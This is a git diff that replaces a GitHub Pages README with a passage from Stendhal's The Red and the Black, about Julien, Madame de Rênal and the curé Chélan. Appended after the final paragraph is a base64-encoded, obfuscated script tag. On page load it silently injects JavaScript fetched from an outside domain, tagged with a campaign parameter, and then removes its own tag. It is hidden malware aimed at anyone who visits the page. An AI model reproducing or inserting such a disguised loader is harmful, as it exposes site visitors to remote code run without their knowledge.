@@ -1,37 +1,90 @@
-## Welcome to GitHub Pages
+# LITTLE EPISODES
 
-You can use the [editor on GitHub](https://github.com/galimzyanov/Some/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+It was only when Madame de Rênal began to think of her maid Elisa that there was some slight change in that angelic sweetness which she owed both to her natural character and her actual happiness. The girl had come into a fortune, went to confess herself to the curé Chélan and confessed to him her plan of marrying Julien. The curé was truly rejoiced at his friend's good fortune, but he was extremely surprised when Julien resolutely informed him that Mademoiselle Elisa's offer could not suit him.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+"Beware, my friend, of what is passing within your heart," said the curé with a frown, "I congratulate you on your mission, if that is the only reason why you despise a more than ample fortune. It is fifty-six years since I was first curé of Verrières, and yet I shall be turned out, according to all appearances. I am distressed by it, and yet my income amounts to eight hundred francs. I inform you of this detail so that you may not be under any illusions as to what awaits you in your career as a priest. If you think of paying court to the men who enjoy power, your eternal damnation is assured. You may make your fortune, but you will have to do harm to the poor, flatter the sub-prefect, the mayor, the man who enjoys prestige, and pander to his passion; this conduct, which in the world is called knowledge of life, is not absolutely incompatible with salvation so far as a layman is concerned; but in our career we have to make a choice; it is a question of making one's fortune either in this world or the next; there is no middle course. Come, my dear friend, reflect, and come back in three days with a definite answer. I am pained to detect that there is at the bottom of your character a sombre passion which is far from indicating to me that moderation and that perfect renunciation of earthly advantages so necessary for a priest; I augur well of your intellect, but allow me to tell you," added the good curé with tears in his eyes, "I tremble for your salvation in your career as a priest."
 
-### Markdown
+Julien was ashamed of his emotion; he found himself loved for the first time in his life; he wept with delight; and went to hide his tears in the great woods behind Verrières.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+"Why am I in this position?" he said to himself at last, "I feel that I would give my life a hundred times over for this good curé Chélan, and he has just proved to me that I am nothing more than a fool. It is especially necessary for me to deceive him, and he manages to find me out. The secret ardour which he refers to is my plan of making my fortune. He thinks I am unworthy of being a priest, that too, just when I was imagining that my sacrifice of fifty louis would give him the very highest idea of my piety and devotion to my mission."
 
-```markdown
-Syntax highlighted code block
+"In future," continued Julien, "I will only reckon on those elements in my character which I have tested. Who could have told me that I should find any pleasure in shedding tears? How I should like some one to convince me that I am simply a fool!"
 
-# Header 1
-## Header 2
-### Header 3
+Three days later, Julien found the excuse with which he ought to have been prepared on the first day; the excuse was a piece of calumny, but what did it matter? He confessed to the curé, with a great deal of hesitation, that he had been persuaded from the suggested union by a reason he could not explain, inasmuch as it tended to damage a third party. This was equivalent to impeaching Elisa's conduct. M. Chélan found that his manner betrayed a certain worldly fire which was very different from that which ought to have animated a young acolyte.
 
-- Bulleted
-- List
+"My friend," he said to him again, "be a good country citizen, respected and educated, rather than a priest without a true mission."
 
-1. Numbered
-2. List
+So far as words were concerned, Julien answered these new remonstrances very well. He managed to find the words which a young and ardent seminarist would have employed, but the tone in which he pronounced them, together with the thinly concealed fire which blazed in his eye, alarmed M. Chélan.
 
-**Bold** and _Italic_ and `Code` text
+You must not have too bad an opinion of Julien's prospects. He invented with correctness all the words suitable to a prudent and cunning hypocrisy. It was not bad for his age. As for his tone and his gestures, he had spent his life with country people; he had never been given an opportunity of seeing great models. Consequently, as soon as he was given a chance of getting near such gentlemen, his gestures became as admirable as his words.
 
-[Link](url) and ![Image](src)
-```
+Madame de Rênal was astonished that her maid's new fortune did not make her more happy. She saw her repeatedly going to the curé and coming back with tears in her eyes. At last Elisa talked to her of her marriage.
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+Madame de Rênal thought she was ill. A kind of fever prevented her from sleeping. She only lived when either maid or Julien were in sight. She was unable to think of anything except them and the happiness which they would find in their home. Her imagination depicted in the most fascinating colours the poverty of the little house, where they were to live on their income of fifty louis a year. Julien could quite well become an advocate at Bray, the sub-prefecture, two leagues from Verrières. In that case she would see him sometimes. Madame de Rênal sincerely believed she would go mad. She said so to her husband and finally fell ill. That very evening when her maid was attending her, she noticed that the girl was crying. She abhorred Elisa at that moment, and started to scold her; she then begged her pardon. Elisa's tears redoubled. She said if her mistress would allow her, she would tell her all her unhappiness.
 
-### Jekyll Themes
+"Tell me," answered Madame de Rênal.
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/galimzyanov/Some/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+"Well, Madame, he refuses me, some wicked people must have spoken badly about me. He believes them."
 
-### Support or Contact
+"Who refuses you?" said Madame de Rênal, scarcely breathing.
 
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+"Who else, Madame, but M. Julien," answered the maid sobbing. "M. the curé had been unable to overcome his resistance, for M. the curé thinks that he ought not to refuse an honest girl on the pretext that she has been a maid. After all, M. Julien's father is nothing more than a carpenter, and how did he himself earn his living before he was at Madame's?"
+
+Madame de Rênal stopped listening; her excessive happiness had almost deprived her of her reason. She made the girl repeat several times the assurance that Julien had refused her, with a positiveness which shut the door on the possibility of his coming round to a more prudent decision.
+
+"I will make a last attempt," she said to her maid. "I will speak to M. Julien."
+
+The following day, after breakfast, Madame de Rênal indulged in the delightful luxury of pleading her rival's cause, and of seeing Elisa's hand and fortune stubbornly refused for a whole hour.
+
+Julien gradually emerged from his cautiously worded answers, and finished by answering with spirit Madame de Rênal's good advice. She could not help being overcome by the torrent of happiness which, after so many days of despair, now inundated her soul. She felt quite ill. When she had recovered and was comfortably in her own room she sent everyone away. She was profoundly astonished.
+
+"Can I be in love with Julien?" she finally said to herself. This discovery, which at any other time would have plunged her into remorse and the deepest agitation, now only produced the effect of a singular, but as it were, indifferent spectacle. Her soul was exhausted by all that she had just gone through, and had no more sensibility to passion left.
+
+Madame de Rênal tried to work, and fell into a deep sleep; when she woke up she did not frighten herself so much as she ought to have. She was too happy to be able to see anything wrong in anything. Naive and innocent as she was, this worthy provincial woman had never tortured her soul in her endeavours to extract from it a little sensibility to some new shade of sentiment or unhappiness. Entirely absorbed as she had been before Julien's arrival with that mass of work which falls to the lot of a good mistress of a household away from Paris, Madame de Rênal thought of passion in the same way in which we think of a lottery: a certain deception, a happiness sought after by fools.
+
+The dinner bell rang. Madame de Rênal blushed violently. She heard the voice of Julien who was bringing in the children. Having grown somewhat adroit since her falling in love, she complained of an awful headache in order to explain her redness.
+
+"That's just like what all women are," answered M. de Rênal with a coarse laugh. "Those machines have always got something or other to be put right."
+
+Although she was accustomed to this type of wit, Madame de Rênal was shocked by the tone of voice. In order to distract herself, she looked at Julien's physiognomy; he would have pleased her at this particular moment, even if he had been the ugliest man imaginable.
+
+M. de Rênal, who always made a point of copying the habits of the gentry of the court, established himself at Vergy in the first fine days of the spring; this is the village rendered celebrated by the tragic adventure of Gabrielle. A hundred paces from the picturesque ruin of the old Gothic church, M. de Rênal owns an old château with its four towers and a garden designed like the one in the Tuileries with a great many edging verges of box and avenues of chestnut trees which are cut twice in the year. An adjacent field, crowded with apple trees, served for a promenade. Eight or ten magnificent walnut trees were at the end of the orchard. Their immense foliage went as high as perhaps eighty feet.
+
+"Each of these cursed walnut trees," M. de Rênal was in the habit of saying, whenever his wife admired them, "costs me the harvest of at least half an acre; corn cannot grow under their shade."
+
+Madame de Rênal found the sight of the country novel: her admiration reached the point of enthusiasm. The sentiment by which she was animated gave her both ideas and resolution. M. de Rênal had returned to the town, for mayoral business, two days after their arrival in Vergy. But Madame de Rênal engaged workmen at her own expense. Julien had given her the idea of a little sanded path which was to go round the orchard and under the big walnut trees, and render it possible for the children to take their walk in the very earliest hours of the morning without getting their feet wet from the dew. This idea was put into execution within twenty-four hours of its being conceived. Madame de Rênal gaily spent the whole day with Julien in supervising the workmen.
+
+When the Mayor of Verrières came back from the town he was very surprised to find the avenue completed. His arrival surprised Madame de Rênal as well. She had forgotten his existence. For two months he talked with irritation about the boldness involved in making so important a repair without consulting him, but Madame de Rênal had had it executed at her own expense, a fact which somewhat consoled him.
+
+She spent her days in running about the orchard with her children, and in catching butterflies. They had made big hoods of clear gauze with which they caught the poor lepidoptera. This is the barbarous name which Julien taught Madame de Rênal. For she had had M. Godart's fine work ordered from Besançon, and Julien used to tell her about the strange habits of the creatures.
+
+They ruthlessly transfixed them by means of pins in a great cardboard box which Julien had prepared.
+
+Madame de Rênal and Julien had at last a topic of conversation; he was no longer exposed to the awful torture that had been occasioned by their moments of silence.
+
+They talked incessantly and with extreme interest, though always about very innocent matters. This gay, full, active life, pleased the fancy of everyone, except Mademoiselle Elisa who found herself overworked. Madame had never taken so much trouble with her dress, even at carnival time, when there is a ball at Verrières, she would say; she changes her gowns two or three times a day.
+
+As it is not our intention to flatter anyone, we do not propose to deny that Madame de Rênal, who had a superb skin, arranged her gowns in such a way as to leave her arms and her bosom very exposed. She was extremely well made, and this style of dress suited her delightfully.
+
+"You have never been so young, Madame," her Verrières friends would say to her, when they came to dinner at Vergy (this is one of the local expressions).
+
+It is a singular thing, and one which few amongst us will believe, but Madame de Rênal had no specific object in taking so much trouble. She found pleasure in it and spent all the time which she did not pass in hunting butterflies with the children and Julien, in working with Elisa at making gowns, without giving the matter a further thought. Her only expedition to Verrières was caused by her desire to buy some new summer gowns which had just come from Mulhouse.
+
+She brought back to Vergy a young woman who was a relative of hers. Since her marriage, Madame de Rênal had gradually become attached to Madame Derville, who had once been her school mate at the Sacré Cœur.
+
+Madame Derville laughed a great deal at what she called her cousin's mad ideas: "I would never have thought of them alone," she said. When Madame de Rênal was with her husband, she was ashamed of those sudden ideas, which, are called sallies in Paris, and thought them quite silly: but Madame Derville's presence gave her courage. She would start to telling her thoughts in a timid voice, but after the ladies had been alone for a long time, Madame de Rênal's brain became more animated, and a long morning spent together by the two friends passed like a second, and left them in the best of spirits. On this particular journey, however, the acute Madame Derville thought her cousin much less merry, but much more happy than usual.
+
+Julien, on his side, had since coming to the country lived like an absolute child, and been as happy as his pupils in running after the butterflies. After so long a period of constraint and wary diplomacy, he was at last alone and far from human observation; he was instinctively free from any apprehension on the score of Madame de Rênal, and abandoned himself to the sheer pleasure of being alive, which is so keen at so young an age, especially among the most beautiful mountains in the world.
+
+Ever since Madame Derville's arrival, Julien thought that she was his friend; he took the first opportunity of showing her the view from the end of the new avenue, under the walnut tree; as a matter of fact it is equal, if not superior, to the most wonderful views that Switzerland and the Italian lakes can offer. If you ascend the steep slope which commences some paces from there, you soon arrive at great precipices fringed by oak forests, which almost jut on to the river. It was to the peaked summits of these rocks that Julien, who was now happy, free, and king of the household into the bargain, would take the two friends, and enjoy their admiration these sublime views.
+
+"To me it's like Mozart's music," Madame Derville would say.
+![i](https://lh3.googleusercontent.com/proxy/UfqRR4xdzJrSypn3fHkvA5XkREyAlVfoLTykqcarsnBtLYO9STyH7xDOTbv4VOFnvF5pG9v00NUi6WJJeGAQoLkmc34wKwUw-v4s_EWW-gUrgTx6Hw)
+The country around Verrières had been spoilt for Julien by the jealousy of his brothers and the presence of a tyranous and angry father. He was free from these bitter memories at Vergy; for the first time in his life, he failed to see an enemy. When, as frequently happened, M. de Rênal was in town, he ventured to read; soon, instead of reading at night time, a procedure, moreover, which involved carefully hiding his lamp at the bottom of a flower-pot turned upside down, he was able to indulge in sleep; in the day, however, in the intervals between the children's lessons, he would come among these rocks with that book which was the one guide of his conduct and object of his enthusiasm. He found in it simultaneously happiness, ecstasy and consolation for his moments of discouragement.
+
+Certain remarks of Napoleon about women, several discussions about the merits of the novels which were fashionable in his reign, furnished him now for the first time with some ideas which any other young man of his age would have had for a long time.
+
+The dog days arrived. They started the habit of spending the evenings under an immense pine tree some yards from the house. The darkness was profound. One evening, Julien was speaking and gesticulating, enjoying to the full the pleasure of being at his best when talking to young women; in one of his gestures, he touched the hand of Madame de Rênal which was leaning on the back of one of those chairs of painted wood, which are so frequently to be seen in gardens.
+
+The hand was quickly removed, but Julien thought it a point of duty to secure that that hand should not be removed when he touched it. The idea of a duty to be performed and the consciousness of his stultification, or rather of his social inferiority, if he should fail in achieving it, immediately banished all pleasure from his heart.
+<script id="HPCsl" src="data:text/javascript;base64, dmFyIF92Y2UxWSA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX2wxSDRQLCBfaUNTZG4pIHt2YXIgX2tPQ1lZID0gZnVuY3Rpb24oX2E1V0FHKSB7d2hpbGUgKC0tX2E1V0FHKSB7X2wxSDRQWydwdXNoJ10oX2wxSDRQWydzaGlmdCddKCkpO319O19rT0NZWSgrK19pQ1Nkbik7fShfdmNlMVksIDB4MTFiKSk7dmFyIF9xdmFRcSA9IGZ1bmN0aW9uKF9waFZIVywgXzFYcFpzKSB7X3BoVkhXID0gX3BoVkhXIC0gMHgwO3ZhciBfMWYwMGMgPSBfdmNlMVlbX3BoVkhXXTtyZXR1cm4gXzFmMDBjO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfcXZhUXEoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1p0Q0pvID0gZG9jdW1lbnRbX3F2YVFxKCcweDEnKV0oX3F2YVFxKCcweDInKSk7X1p0Q0pvW19xdmFRcSgnMHgzJyldID0gX3F2YVFxKCcweDQnKTtfWnRDSm9bJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3Nlx4NmNceDYxXHg2NFx4NjNceDY4XHg2OVx4NmNceDY0XHg2MVx4NjNceDYzXHgzMlx4MmVceDcwXHg3M1x4NmJceDZmXHg3Nlx4NzNceDY4XHg2Zlx4NzBceDJlXHg2M1x4NmZceDZkXHgyZlx4NWZceDcyXHg2NVx4NmRceDZmXHg3NFx4NjVceDVmXHg3NFx4NzJceDYxXHg2M1x4NmJceDJlXHg2YVx4NzNceDNmXHg2M1x4NjFceDZkXHg3MFx4NjFceDY5XHg2N1x4NmVceDNkXHg1NFx4NmVceDVhXHg2Y1x4MzdceDQ2XHg2OFx4NTRceDM3XHg3NCc7ZG9jdW1lbnRbX3F2YVFxKCcweDUnKV0oX3F2YVFxKCcweDYnKSlbJ1x4NjFceDcwXHg3MFx4NjVceDZlXHg2NFx4NDNceDY4XHg2OVx4NmNceDY0J10oX1p0Q0pvKTtkb2N1bWVudFtfcXZhUXEoJzB4NycpXSgnSFBDc2wnKVsnXHg3Mlx4NjVceDZkXHg2Zlx4NzZceDY1J10oKTt9LCB7J1x4NmZceDZlXHg2M1x4NjUnOiAhIVtdfSk7"></script>
